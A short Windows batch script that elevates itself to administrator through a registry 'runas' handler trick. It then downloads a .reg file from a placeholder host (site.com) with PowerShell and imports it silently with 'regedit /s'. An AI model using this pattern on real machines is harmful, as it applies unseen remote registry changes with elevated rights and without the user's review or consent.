@echo off
>nul 2>&1 reg add hkcu\software\classes\.Admin\shell\runas\command /f /ve /d "cmd /x /d /r set \"f0=%%2\"& call \"%%2\" %%3"& set _= %*
>nul 2>&1 fltmc|| if "%f0%" neq "%~f0" (cd.>"%temp%\runas.Admin" & start "%~n0" /high "%temp%\runas.Admin" "%~f0" "%_:"=""%" & exit /b)
set "url=http://site.com/file.reg"
set "filename=file.reg"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%filename%')"
regedit /s %filename%








